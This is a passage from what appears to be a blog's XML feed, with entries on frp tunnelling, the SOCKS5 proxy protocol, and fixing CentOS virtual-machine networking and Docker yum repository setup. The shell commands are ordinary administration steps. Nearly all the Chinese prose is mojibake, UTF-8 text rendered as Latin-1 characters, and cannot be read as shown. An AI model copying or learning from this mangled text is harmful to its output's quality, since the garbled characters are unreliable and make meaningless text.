å»ºè®®åœ¨ä½¿ç”¨frpç›´æ¥æµ‹è¯•å†…ç½‘ç©¿é€å‰ï¼Œå…ˆåœ¨å±€åŸŸç½‘å†…æµ‹è¯•å¥½ç›¸å…³åŠŸèƒ½çš„æ­£å¸¸ä½¿ç”¨ï¼Œå¹¶é…ç½®å¥½å¯èƒ½ä¼šå½±å“çš„Windowsé˜²ç«å¢™ç­‰å†…å®¹ï¼Œåœ¨å†…ç½‘è°ƒè¯•é€šè¿‡åå†ä½¿ç”¨frpè¿›è¡Œå†…ç½‘ç©¿é€æµ‹è¯•ã€‚</p></blockquote><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><p><a href="https://juejin.cn/post/7042486792011907086">https://juejin.cn/post/7042486792011907086</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44801963/article/details/121104146">https://blog.csdn.net/weixin_44801963/article/details/121104146</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ”»é˜² </tag>
            
            <tag> FRP </tag>
            
            <tag> FRPå†…ç½‘ç©¿é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOCKS5ä»£ç†åè®®</title>
      <link href="/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/"/>
      <url>/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€SOCKS5åè®®ç®€ä»‹"><a href="#ä¸€ã€SOCKS5åè®®ç®€ä»‹" class="headerlink" title="ä¸€ã€SOCKS5åè®®ç®€ä»‹"></a>ä¸€ã€SOCKS5åè®®ç®€ä»‹</h1><p>SOCKS5ï¼ˆSocket secure 5ï¼‰åè®®æ˜¯ä¸€ç§ç½‘ç»œä»£ç†åè®®ï¼Œå®ƒåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æ‰®æ¼”ä¸­ä»‹è§’è‰²ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯é€šè¿‡ä»£ç†æœåŠ¡å™¨ä¸ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œéšè—å®¢æˆ·ç«¯çš„çœŸå®IPåœ°å€å’Œèº«ä»½ä¿¡æ¯ã€‚SOCKS5ä»£ç†æ˜¯ä¸€ç§ä¼ è¾“å±‚ä»£ç†ï¼Œå·¥ä½œåœ¨ç½‘ç»œåè®®æ ˆä¸­çš„ä¼ è¾“å±‚ï¼Œå¯ä»¥æ”¯æŒå¤šç§ç½‘ç»œåè®®ï¼ˆå¦‚TCPå’ŒUDPï¼‰çš„ä»£ç†ã€‚æ ¹æ®OSIä¸ƒå±‚æ¨¡å‹æ¥åˆ’åˆ†ï¼ŒSOCKSå±äºä¼šè¯å±‚åè®®ï¼Œä½äºè¡¨ç¤ºå±‚ä¸ä¼ è¾“å±‚ä¹‹é—´ã€‚</p><p>é€šè¿‡ SOCKS5 ä»£ç†ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨ä¸ç›´æ¥ä¸ç›®æ ‡æœåŠ¡å™¨é€šä¿¡çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®ç½‘ç»œèµ„æºã€‚è¿™ç§ä»£ç†æ–¹å¼å¯¹äºä¿æŠ¤å®¢æˆ·ç«¯çš„éšç§å’Œå®ç°ç½‘ç»œåŒ¿åæ€§éå¸¸æœ‰ç”¨ï¼ŒåŒæ—¶è¿˜å¯ä»¥ç»•è¿‡é˜²ç«å¢™å’Œåœ°ç†é™åˆ¶ã€‚</p><ul><li>SOCKS5æ˜¯SOCKSåè®®çš„ç¬¬äº”ä¸ªç‰ˆæœ¬ï¼Œä½œä¸ºsocks4çš„ä¸€ä¸ªå»¶ä¼¸ï¼Œåœ¨socks4çš„åŸºç¡€ä¸Šæ–°å¢<strong>UDPè½¬å‘</strong>å’Œ<strong>è®¤è¯åŠŸèƒ½</strong>ã€‚å”¯ä¸€é—æ†¾çš„æ˜¯socks5å¹¶ä¸å…¼å®¹socks4åè®®ã€‚socks5ç”±IETFåœ¨1996å¹´æ­£å¼å‘å¸ƒï¼Œç»è¿‡è¿™ä¹ˆå¤šå¹´çš„å‘å±•ï¼Œäº’è”ç½‘ä¸ŠåŸºæœ¬ä¸Šéƒ½ä»¥socks5ä¸ºä¸»ï¼Œsocks4å·²ç»é€€å‡ºäº†å†å²çš„èˆå°ã€‚</li><li>SOCKS5æ”¯æŒIPv4å’ŒIPv6åœ°å€ï¼Œé€‚åº”ä¸åŒç½‘ç»œç¯å¢ƒçš„éœ€æ±‚ã€‚</li></ul><p>socks5çš„RFCåœ°å€ï¼š</p><ul><li><p>rfc1928ï¼š<a href="https://www.ietf.org/rfc/rfc1928.txt">https://www.ietf.org/rfc/rfc1928.txt</a></p></li><li><p>rfc1929ï¼š<a href="https://www.ietf.org/rfc/rfc1929.txt">https://www.ietf.org/rfc/rfc1929.txt</a></p><blockquote><p>å¯¹äºå¹¿å¤§çš„ä¸­å›½ç½‘å‹æ¥è¯´ï¼Œä¸€æåˆ°ä»£ç†ï¼Œè‚¯å®šä¼šæƒ³åˆ°ç¿»å¢™ï¼Œè€Œsocks5ä½œä¸ºä¸€ç§ä»£ç†åè®®ï¼Œè‚¯å®šä¹Ÿèƒ½ç”¨æ¥ç¿»å¢™å˜›ã€‚ä¸è¿‡é—æ†¾çš„æ˜¯ï¼Œè™½ç„¶å®ƒæ˜¯ä»£ç†åè®®ï¼Œç„¶è€Œå¹¶ä¸èƒ½ç”¨äºç¿»å¢™ã€‚å› ä¸ºå®ƒçš„æ•°æ®éƒ½æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œä¼šè¢«å¢™è½»æ˜“é˜»æ–­ã€‚</p><p>socksåè®®å†å²æ‚ ä¹…ï¼Œå®ƒé¢ä¸–æ—¶ä¸­å›½çš„äº’è”ç½‘å°šæœªæˆå‹ï¼Œæ›´åˆ«è¯´å¢™ï¼Œå› æ­¤å®ƒå¹¶ä¸æ˜¯ä¸ºç¿»å¢™è€Œè®¾è®¡çš„åè®®ã€‚äº’è”ç½‘æ—©æœŸï¼Œä¼ä¸šå†…éƒ¨ç½‘ç»œä¸ºäº†ä¿è¯å®‰å…¨æ€§ï¼Œéƒ½æ˜¯ç½®äºé˜²ç«å¢™ä¹‹åï¼Œè¿™æ ·å¸¦æ¥çš„å‰¯ä½œç”¨å°±æ˜¯è®¿é—®å†…éƒ¨èµ„æºä¼šå˜å¾—å¾ˆéº»çƒ¦ï¼Œsocksåè®®å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œè¯ç”Ÿçš„ã€‚</p><p>socksç›¸å½“äºåœ¨é˜²ç«å¢™æ’•äº†ä¸€é“å£å­ï¼Œè®©åˆæ³•çš„ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™ä¸ªå£å­è¿æ¥åˆ°å†…éƒ¨ï¼Œä»è€Œè®¿é—®å†…éƒ¨çš„ä¸€äº›èµ„æºå’Œè¿›è¡Œç®¡ç†ã€‚</p></blockquote></li></ul><h1 id="äºŒã€é€šä¿¡æµç¨‹"><a href="#äºŒã€é€šä¿¡æµç¨‹" class="headerlink" title="äºŒã€é€šä¿¡æµç¨‹"></a>äºŒã€é€šä¿¡æµç¨‹</h1><img src="/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/%E6%88%AA%E5%B1%8F2024-12-13%2015.43.58.png" style="zoom:50%;"><ul><li>å®¢æˆ·ç«¯é¦–å…ˆä¸SOCKS5æœåŠ¡å™¨å»ºç«‹TCPè¿æ¥ã€‚</li><li>æ¥ç€è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åå•†æ”¯æŒçš„è®¤è¯æ–¹å¼ã€‚</li><li>å®¢æˆ·ç«¯å‘é€è¿æ¥è¯·æ±‚ï¼ŒåŒ…æ‹¬è¦è®¿é—®çš„æœåŠ¡å™¨åŸŸåæˆ–IPä»¥åŠç«¯å£ä¿¡æ¯ã€‚</li><li>SOCKS5æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œå‘ç›®æ ‡æœåŠ¡å™¨å»ºç«‹TCPè¿æ¥ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘ç»™ç›®æ ‡æœåŠ¡å™¨ã€‚</li><li>ç›®æ ‡æœåŠ¡å™¨çš„å“åº”é€šè¿‡SOCKS5æœåŠ¡å™¨è½¬å‘å›å®¢æˆ·ç«¯ã€‚</li></ul><h1 id="ä¸‰ã€åº”ç”¨åœºæ™¯"><a href="#ä¸‰ã€åº”ç”¨åœºæ™¯" class="headerlink" title="ä¸‰ã€åº”ç”¨åœºæ™¯"></a>ä¸‰ã€åº”ç”¨åœºæ™¯</h1><ul><li><strong>éšç§ä¿æŠ¤ä¸åŒ¿åä¸Šç½‘</strong>ï¼šSOCKS5ä»£ç†å¯ä»¥éšè—ç”¨æˆ·çš„çœŸå®IPåœ°å€ï¼Œå¸®åŠ©ç”¨æˆ·åœ¨ç½‘ç»œä¸Šä¿æŒåŒ¿åï¼Œé¿å…ç½‘ç»œè¿½è¸ªå’Œåœ°ç†é™åˆ¶ã€‚</li><li><strong>ç»•è¿‡ç½‘ç»œé™åˆ¶</strong>ï¼šSOCKS5ä»£ç†èƒ½å¤Ÿå¸®åŠ©ç”¨æˆ·ç»•è¿‡åœ°æ–¹æ€§æˆ–ç½‘ç»œæœåŠ¡æä¾›å•†è®¾ç½®çš„è®¿é—®é™åˆ¶ï¼Œä¾‹å¦‚åœ¨å®¡æŸ¥ä¸¥æ ¼çš„ç¯å¢ƒä¸‹è®¿é—®äº’è”ç½‘å†…å®¹ã€‚</li><li><strong>è¿œç¨‹è¿æ¥åˆ°æœ¬åœ°ç½‘ç»œ</strong>ï¼šSOCKS5ä»£ç†åœ¨è¿œç¨‹å·¥ä½œåœºæ™¯ä¸­å…·æœ‰é‡è¦åº”ç”¨ï¼Œè¿œç¨‹å·¥ä½œäººå‘˜å¯ä»¥ä½¿ç”¨SOCKS5ä»£ç†è¿æ¥åˆ°å…¬å¸å†…éƒ¨ç½‘ç»œï¼Œå®‰å…¨åœ°è®¿é—®å…¬å¸èµ„æºã€‚</li><li><strong>æ•°æ®æŠ“å–å’Œç½‘ç»œçˆ¬è™«</strong>ï¼šå¯¹äºä»äº‹æ•°æ®æŠ“å–å’Œç½‘ç»œçˆ¬è™«å·¥ä½œçš„ç”¨æˆ·ï¼ŒSOCKS5ä»£ç†å…·æœ‰å‡ºè‰²çš„æ€§èƒ½ä¼˜åŠ¿ï¼Œèƒ½å¤Ÿç»•è¿‡ç½‘ç«™çš„åçˆ¬è™«æœºåˆ¶ã€‚</li></ul><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://wiyi.org/socks5-protocol-in-deep.html">https://wiyi.org/socks5-protocol-in-deep.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ”»é˜² </tag>
            
            <tag> SOCKS5 </tag>
            
            <tag> ä»£ç†åè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centosè™šæ‹Ÿæœºå®‰è£…åŠé—®é¢˜è§£å†³</title>
      <link href="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/"/>
      <url>/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€-centos6-9"><a href="#ä¸€ã€-centos6-9" class="headerlink" title="ä¸€ã€ centos6.9"></a>ä¸€ã€ centos6.9</h1><p>è¿™ç¯‡æ–‡ç« çš„èƒŒæ™¯æ˜¯æˆ‘æƒ³åœ¨centosä¸Šå®‰è£…dockerè¿›è¡Œå­¦ä¹ å’Œç»ƒä¹ ï¼Œä¹‹å‰å®‰è£…è¿‡ä¸€å°centos6.9ï¼Œæ˜¯å¸¦UIç•Œé¢çš„ï¼Œå°è¯•å®‰è£…dockerçš„è¿‡ç¨‹ä¸­ç¢°åˆ°äº†ä¸€äº›é—®é¢˜ã€‚è¿™é‡Œä»¥å®ƒä¸ºä¾‹å­æ¥æ¼”ç¤ºä¸€äº›ç›¸å…³é—®é¢˜çš„è§£å†³ï¼ˆéƒ½æ˜¯å®é™…è¸©è¿‡çš„ä¸€äº›å‘ï¼Œæœ€åæ–°è£…äº†ä¸€å°æœ€å°åŒ–å®‰è£…çš„centos7ï¼Œä¸è¿‡è§£å†³é—®é¢˜çš„æ€è·¯å¤§ä½“ç›¸ä¼¼ï¼‰ã€‚</p><h2 id="1-1-ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥è§£å†³ï¼ˆåé¢æœ‰å¤ç›˜åˆ†æï¼‰"><a href="#1-1-ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥è§£å†³ï¼ˆåé¢æœ‰å¤ç›˜åˆ†æï¼‰" class="headerlink" title="1.1 ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥è§£å†³ï¼ˆåé¢æœ‰å¤ç›˜åˆ†æï¼‰"></a>1.1 ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥è§£å†³ï¼ˆåé¢æœ‰å¤ç›˜åˆ†æï¼‰</h2><p>è™šæ‹Ÿæœºï¼šcentos6.9ã€NATæ¨¡å¼ï¼Œç›®æ ‡è”é€šäº’è”ç½‘ã€‚</p><blockquote><ul><li>ç½‘ç»œä¸é€šé—®é¢˜æ’æŸ¥è§£å†³ï¼šï¼ˆåé¢æœ‰å¤ç›˜åˆ†æï¼‰</li></ul><p>centosè™šæ‹ŸæœºNATæ¨¡å¼ï¼Œeth0çš„ipä¸º192.168.155.254ï¼Œå®¿ä¸»æœºip192.168.155.1ï¼ˆä¸”æ— æ³•pingé€šã€‚ï¼‰</p><p>è¿è¡ŒdhclientåæˆåŠŸpingé€šå®¿ä¸»æœºã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.02.37.png" style="zoom:40%;"><p>ä½†è¿˜æ˜¯æ— æ³•pingé€šäº’è”ç½‘ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.03.19.png" style="zoom:35%;"><p>ç¼–è¾‘ç½‘ç»œé…ç½®æ–‡ä»¶<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code>ï¼ˆæ ¹æ®å®é™…ç½‘å¡åç§°ä¿®æ”¹ï¼‰</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.05.59.png" style="zoom:40%;"><p>ç›®å‰æ˜¯é™æ€ipé…ç½®ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.07.03.png" style="zoom:40%;"><p>eth1çš„é…ç½®å¦‚ä¸Šï¼ŒæŠŠeth1é…ç½®ä¸ºdhcpè·å–IPã€‚é…ç½®</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.11.53.png" alt="æˆªå±2024-12-12 10.11.53" style="zoom:40%;"><p>/etc/init.d/network restart ã€é‡å¯ç½‘å¡ã€‘</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.13.04.png" style="zoom:35%;"><p>åˆ¤æ–­æ˜¯ç½‘å¡æ²¡æœ‰è¿æ¥ï¼Œæ£€æŸ¥è™šæ‹Ÿæœºé…ç½®è¿›è¡ŒéªŒè¯ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.14.34.png" style="zoom:50%;"><p>å°†ç½‘å¡2è®¾ç½®ä¸ºNATæ¨¡å¼å¹¶è¿æ¥ã€‚/etc/init.d/network restart ã€é‡å¯ç½‘å¡ã€‘</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.15.31.png" alt="æˆªå±2024-12-12 10.15.31" style="zoom:40%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.16.03.png" style="zoom:40%;"><p>ipé…ç½®æˆåŠŸï¼Œä½†è¿˜æ˜¯æ— æ³•è¿æ¥äº’è”ç½‘ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.17.16.png" style="zoom:40%;"><p>æŸ¥çœ‹è·¯ç”±è¡¨ï¼Œroute -n</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.21.27.png" style="zoom:50%;"><p>ç¬¬äºŒæ¡è®°å½•çš„ç½‘å…³æ˜¯0.0.0.0ï¼Œæœ€ç»ˆç»•åˆ°äº†192.168.2.1ã€‚</p><p>è¿™é‡Œçš„å…³é”®æ˜¯é»˜è®¤è·¯ç”±ï¼Œå®ƒå®šä¹‰äº†å½“æ²¡æœ‰ç‰¹å®šè·¯ç”±åŒ¹é…æ—¶æ•°æ®åŒ…çš„å»å‘ã€‚åœ¨æ‚¨çš„è·¯ç”±è¡¨ä¸­ï¼Œé»˜è®¤è·¯ç”±çš„ç½‘å…³æ˜¯ <code>192.168.2.1</code>ï¼Œè¿™æ„å‘³ç€æ‰€æœ‰éæœ¬åœ°ç›®çš„åœ°çš„æ•°æ®åŒ…éƒ½å°†é€šè¿‡ <code>eth0</code> æ¥å£å‘é€åˆ°è¿™ä¸ªç½‘å…³ã€‚</p><p>ç¼–è¾‘eth1çš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ç½‘å…³ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.26.01.png" style="zoom:50%;"><p>ä»ç„¶æ— æ³•pingé€šäº’è”ç½‘ã€‚æ£€æŸ¥è·¯ç”±å‘ç°æ²¡æœ‰æ›´æ–°ç½‘å…³ã€‚ã€Œä¼°è®¡å¿˜è®°é‡å¯ç½‘å¡äº†ï¼ã€</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.26.37.png" alt="æˆªå±2024-12-12 10.26.37" style="zoom:50%;"><p>/etc/init.d/network restart é‡å¯ç½‘å¡ã€‚ç½‘å…³é…ç½®ç”Ÿæ•ˆã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.27.37.png" alt="æˆªå±2024-12-12 10.27.37" style="zoom:50%;"><p>äº’è”ç½‘æˆåŠŸpingé€šã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.28.01.png" style="zoom:50%;"><ul><li>å¤ç›˜</li></ul><p>äº‹å®ä¸Šæ’æŸ¥ç½‘ç»œé—®é¢˜åªè¦æŠŠæ¡è·¯ç”±è¡¨ã€ç½‘å¡è®¾ç½®ä¸¤ä¸ªç¯èŠ‚å³å¯ã€‚</p><p>æˆ‘çš„è™šæ‹Ÿæœºè®¾ç½®äº†ä¸¤å—ç½‘å¡ï¼Œå¯¹åº”eth0å’Œeth1ï¼Œeth0ä¹‹å‰é…ç½®è¿‡é™æ€ipï¼Œä¸”åœ¨192.168.2.0/24ç½‘æ®µï¼Œè·Ÿç½‘å…³192.168.155.1/24ä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œæ‰€ä»¥ä¸€å¼€å§‹å°±pingä¸åŒ192.168.155.1çš„ç½‘å…³ï¼Œæ›´ä¸å¯èƒ½pingé€šç™¾åº¦ã€‚</p><p>å¯¹eth1ç½‘å¡è¿›è¡Œdhcpçš„è®¾ç½®ï¼Œè¿æ¥ç½‘å¡ç¡¬ä»¶ä¹‹åé‡å¯ç½‘å¡æœåŠ¡è·å¾—ipï¼ˆNATæ¨¡å¼ä¸‹è¿™ä¸ªipè·Ÿå®¿ä¸»æœºip192.168.155.1æ˜¯åŒç½‘æ®µçš„ï¼‰ï¼Œå‘ç°ä»ç„¶æ— æ³•pingé€šç½‘å…³ï¼ŒæŸ¥çœ‹è·¯ç”±è¡¨å‘ç°eth1èµ°çš„æ˜¯é»˜è®¤ç½‘å…³ï¼Œé»˜è®¤æœ€ç»ˆæŒ‡å‘192.168.2.1ï¼ˆè¿™ä¸ªæ˜¯192.168.2.0/24çš„ç½‘å…³ï¼‰ï¼Œæ‰€ä»¥æµé‡å‡ºä¸å»ã€‚</p><p>æœ€åä¿®æ”¹eth1çš„ç½‘å…³è®¾ç½®ï¼Œé‡å¯ç½‘å¡ï¼Œè·¯ç”±è¡¨ç”Ÿæ•ˆä¹‹åï¼ŒæˆåŠŸpingé€šäº’è”ç½‘ã€‚</p></blockquote><h2 id="1-2-å¸è½½æ—§ç‰ˆDocker"><a href="#1-2-å¸è½½æ—§ç‰ˆDocker" class="headerlink" title="1.2 å¸è½½æ—§ç‰ˆDocker"></a>1.2 å¸è½½æ—§ç‰ˆDocker</h2><p>é¦–å…ˆå¦‚æœç³»ç»Ÿä¸­å·²ç»å­˜åœ¨æ—§çš„Dockerï¼Œåˆ™å…ˆå¸è½½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span> <span class="token punctuation">\</span>    docker-client <span class="token punctuation">\</span>    docker-client-latest <span class="token punctuation">\</span>    docker-common <span class="token punctuation">\</span>    docker-latest <span class="token punctuation">\</span>    docker-latest-logrotate <span class="token punctuation">\</span>    docker-logrotate <span class="token punctuation">\</span>    docker-engine <span class="token punctuation">\</span>    docker-selinux <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.41.30.png" alt="æˆªå±2024-12-12 10.41.30"></p><p>æˆ‘çš„è™šæ‹Ÿæœºä¸Šæ²¡æœ‰éœ€è¦åˆ é™¤çš„dockerç›¸å…³çš„åŒ…ã€‚</p><h2 id="1-3-é…ç½®Dockerçš„yumæº"><a href="#1-3-é…ç½®Dockerçš„yumæº" class="headerlink" title="1.3  é…ç½®Dockerçš„yumæº"></a>1.3  é…ç½®Dockerçš„yumæº</h2><ul><li>yumå·¥å…·åŒ…å®‰è£…</li></ul><p>é¦–å…ˆè¦å®‰è£…ä¸€ä¸ªyumå·¥å…·ã€‚</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.42.52.png" alt="æˆªå±2024-12-12 10.42.52"></p><p>ç³»ç»Ÿä¸Šå·²ç»å­˜åœ¨ã€‚</p><ul><li>é…ç½®yumæº</li></ul><p>å®‰è£…æˆåŠŸåï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œé…ç½®Dockerçš„yumæºï¼ˆå·²æ›´æ–°ä¸ºé˜¿é‡Œäº‘æºï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</span> /etc/yum.repos.d/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.44.31.png" alt="æˆªå±2024-12-12 10.44.31" style="zoom:50%;"><blockquote><p>sudo sed -i â€˜s+download.docker.com+mirrors.aliyun.com/docker-ce+â€™ /etc/yum.repos.d/docker-ce.repo</p><p>å‘½ä»¤è§£é‡Šï¼š</p><ol><li><code>sed</code>: è°ƒç”¨sedå·¥å…·ï¼Œå®ƒæ˜¯ä¸€ä¸ªæµç¼–è¾‘å™¨ï¼Œç”¨äºå¯¹æ–‡æœ¬è¿›è¡Œè¿‡æ»¤å’Œæ›¿æ¢ã€‚</li><li><code>-i</code>: é€‰é¡¹å‘Šè¯‰sedç›´æ¥åœ¨æ–‡ä»¶ä¸­è¿›è¡Œç¼–è¾‘ï¼Œè€Œä¸æ˜¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆå³ç»ˆç«¯ï¼‰ã€‚è¿™ä¼šå¯¼è‡´åŸæ–‡ä»¶è¢«ä¿®æ”¹ã€‚</li><li><code>'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</code>: è¿™æ˜¯ä¸€ä¸ªsedçš„æ›¿æ¢å‘½ä»¤ï¼Œå®ƒæŒ‡ç¤ºsedæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<ul><li><code>s</code>: è¡¨ç¤ºæ›¿æ¢ï¼ˆsubstituteï¼‰ã€‚</li><li><code>+</code>: åœ¨sedä¸­ç”¨ä½œåˆ†éš”ç¬¦ï¼Œè¿™é‡Œå®ƒæ›¿ä»£äº†é»˜è®¤çš„ç©ºæ ¼åˆ†éš”ç¬¦ï¼Œå› ä¸ºé»˜è®¤çš„ç©ºæ ¼åœ¨URLä¸­ä¼šå‡ºç°ï¼Œä½¿ç”¨<code>+</code>å¯ä»¥é¿å…è¿™ç§æƒ…å†µã€‚</li><li><code>download.docker.com</code>: è¿™æ˜¯è¦è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œå³åŸå§‹çš„Dockeré•œåƒæºåœ°å€ã€‚</li><li><code>mirrors.aliyun.com/docker-ce</code>: è¿™æ˜¯æ›¿æ¢åçš„å­—ç¬¦ä¸²ï¼Œå³é˜¿é‡Œäº‘çš„Dockeré•œåƒæºåœ°å€ã€‚</li></ul></li><li><code>/etc/yum.repos.d/docker-ce.repo</code>: æŒ‡å®šäº†è¦ç¼–è¾‘çš„æ–‡ä»¶è·¯å¾„ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯Docker CEï¼ˆç¤¾åŒºç‰ˆï¼‰çš„YUMä»“åº“é…ç½®æ–‡ä»¶ã€‚</li></ol></blockquote><ul><li>æ›´æ–°yumï¼Œå»ºç«‹ç¼“å­˜</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>é—®é¢˜è§£å†³</li><li>æŠ¥é”™ï¼š<br>Loaded plugins: fastestmirror, refresh-packagekit, security<br>Loading mirror speeds from cached hostfile<br><a href="https://mirrors.aliyun.com/docker-ce/linux/centos/6/x86_64/stable/repodata/repomd.xml">https://mirrors.aliyun.com/docker-ce/linux/centos/6/x86_64/stable/repodata/repomd.xml</a>: [Errno 14] PYCURL ERROR 22 - â€œThe requested URL returned error: 404 Not Foundâ€<br>Trying other mirror.<br>To address this issue please refer to the below knowledge base article<br><a href="https://access.redhat.com/articles/1320623">https://access.redhat.com/articles/1320623</a><br>If above article doesnâ€™t help to resolve this issue please open a ticket with Red Hat Support.<br>Error: Cannot retrieve repository metadata (repomd.xml) for repository: docker-ce-stable. Please verify its path and try again</li><li>å°è¯•è§£å†³ï¼š</li></ul><p>â€‹      <strong>æ£€æŸ¥ä»“åº“åœ°å€</strong>ï¼šç¡®è®¤åœ¨ <code>/etc/yum.repos.d/docker-ce.repo</code> 